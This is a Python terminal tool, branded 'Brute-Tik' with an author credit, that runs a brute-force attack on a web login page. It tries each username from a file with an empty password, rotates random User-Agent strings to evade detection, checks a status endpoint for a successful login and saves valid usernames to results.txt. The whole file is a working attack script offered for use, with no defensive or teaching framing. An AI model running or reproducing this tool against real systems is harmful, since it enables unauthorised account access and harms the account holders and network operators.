import requests
import json
import random
import threading
import curses
from curses import textpad
import time

class UserAgentLoader(threading.Thread):
    def __init__(self, filename):
        threading.Thread.__init__(self)
        self.filename = filename

    def run(self):
        global user_agents
        with open(self.filename, 'r') as f:
            user_agents = json.load(f)['user_agents']

def get_user_input(stdscr, prompt, y, x):
    curses.echo()
    stdscr.addstr(y, x, prompt)
    stdscr.refresh()

    uly = y
    ulx = x - 1
    lry = y + 2
    lrx = x + 21  # تصغير العرض إلى 21 بدلاً من 31

    max_y, max_x = stdscr.getmaxyx()
    print(f"Rectangle coordinates: (uly: {uly}, ulx: {ulx}, lry: {lry}, lrx: {lrx})")
    print(f"Terminal size: (max_y: {max_y}, max_x: {max_x})")

    if lry >= max_y or lrx >= max_x:
        stdscr.addstr(0, 0, "Error: Terminal window is too small for the specified coordinates")
        stdscr.refresh()
        stdscr.getch()
        return ""

    input_field = curses.newwin(1, 20, y + 1, x)  # تصغير عرض النافذة إلى 20 بدلاً من 30
    textpad.rectangle(stdscr, uly, ulx, lry, lrx)
    stdscr.refresh()
    input_field.refresh()
    return input_field.getstr().decode('utf-8')

def update_timer(stdscr, start_time, timer_win):
    while True:
        elapsed_time = int(time.time() - start_time)
        timer_win.clear()
        timer_win.addstr(0, 0, f"Elapsed time: {elapsed_time} seconds")
        timer_win.refresh()
        time.sleep(1)

def bruteforce_login(stdscr):
    global user_agents

    curses.start_color()
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)

    stdscr.clear()
    stdscr.refresh()

    logo = """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ████████╗██╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝ ╚══██╔══╝██║██║ ██╔╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗██║   ██║█████╔╝ 
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██║   ██║██╔═██╗ 
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║   ██║██║  ██╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝   ╚═╝╚═╝  ╚═╝
    """

    stdscr.addstr(2, 0, logo, curses.color_pair(1))
    stdscr.refresh()
    stdscr.addstr(12, 5, ">>> Developed by [Abdullah Bawhab]", curses.color_pair(3))  # تقليل الإزاحة الأفقية
    stdscr.refresh()
    stdscr.addstr(13, 10, "#Instagram : [etuadmin]", curses.color_pair(1))  # تقليل الإزاحة الأفقية
    stdscr.refresh()
    time.sleep(3)
    stdscr.clear()

    stdscr.addstr(0, 0, "Press any key to start...", curses.color_pair(1))
    stdscr.refresh()
    stdscr.getch()

    stdscr.clear()
    stdscr.addstr(2, 2, "Enter URL (e.g., http://example.net) >>> ", curses.color_pair(1))
    stdscr.refresh()
    url = get_user_input(stdscr, "", 2, 35).strip()  # تقليل الإزاحة الأفقية
    login_url = f'{url}/login'
    status_url = f'{url}/status?var=callBack'
    logout_url = f'{url}/logout'  # Adding the logout URL

    stdscr.clear()
    stdscr.addstr(2, 2, "Enter usernames file name >>> ", curses.color_pair(1))
    stdscr.refresh()
    username_file = get_user_input(stdscr, "", 2, 33).strip()
    password = ''

    cleaned_url = url.replace("http://", "")
    headers = {
        'Host': f'{cleaned_url}',
        'Accept': '*/*',
        'Referer': f'{login_url}',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close'
    }

    stdscr.clear()
    stdscr.refresh()

    start_time = time.time()
    timer_win = curses.newwin(1, 20, 0, 0)  # تصغير عرض النافذة إلى 20 بدلاً من 30
    threading.Thread(target=update_timer, args=(stdscr, start_time, timer_win), daemon=True).start()

    stdscr.addstr(2, 2, "Starting brute-force attack...\n\n", curses.color_pair(1))
    stdscr.refresh()

    ua_loader = UserAgentLoader('user_agents.json')
    ua_loader.start()
    ua_loader.join()

    try:
        attempts = 1
        with open(username_file, 'r') as file:
            for line in file:
                username = line.strip()
                try:
                    headers['User-Agent'] = random.choice(user_agents)

                    session = requests.Session()

                    response = session.post(login_url, data={'username': username, 'password': password}, headers=headers)

                    if response.status_code != 200:
                        stdscr.addstr(f'Failed to login with username: {username}, received status code: {response.status_code}\n', curses.color_pair(3))
                        stdscr.refresh()
                        continue

                    status_response = session.get(status_url, headers=headers)

                    if status_response.status_code != 200:
                        stdscr.addstr(f'Failed to get status for username: {username}, received status code: {status_response.status_code}\n', curses.color_pair(3))
                        stdscr.refresh()
                        continue

                    try:
                        response_data = status_response.json()
                    except ValueError:
                        stdscr.move(5, 0)
                        stdscr.clrtoeol()
                        stdscr.addstr(f'Attempt {attempts}: Username is : {username}', curses.color_pair(3))  # Print attempts number and username
                        stdscr.refresh()
                        attempts += 1
                        continue

                    if response_data.get("logged_in") == "yes":
                        success_message = f'\n[+] Success! The username is: {username}'
                        for char in success_message:
                            stdscr.addstr(char, curses.color_pair(2))
                            stdscr.refresh()
                            time.sleep(0.1)

                        with open('results.txt', 'a') as results_file:
                            results_file.write(username + '\n')

                        # Logout the user
                        session.get(logout_url, headers=headers)

                        stdscr.addstr("\n[!] User logged out successfully\n", curses.color_pair(3))
                        stdscr.refresh()
                        
                except requests.ConnectionError:
                    stdscr.addstr(f'[#] Network problem or URL is not responding for username: {username}\n', curses.color_pair(3))
                    stdscr.refresh()
                    continue
                except requests.RequestException as e:
                    stdscr.addstr(f'[#] An error occurred with username {username}: {e}\n', curses.color_pair(3))
                    stdscr.refresh()
                    continue

        stdscr.addstr('[*] Failed to find the usernames list.\n', curses.color_pair(3))
        stdscr.refresh()

    except FileNotFoundError:
        stdscr.addstr(f'Error: File {username_file} not found!\n', curses.color_pair(3))
        stdscr.refresh()

    stdscr.addstr('Press any key to exit...', curses.color_pair(1))
    stdscr.refresh()
    stdscr.getch()

def main():
    curses.wrapper(bruteforce_login)

if __name__ == "__main__":
    main()
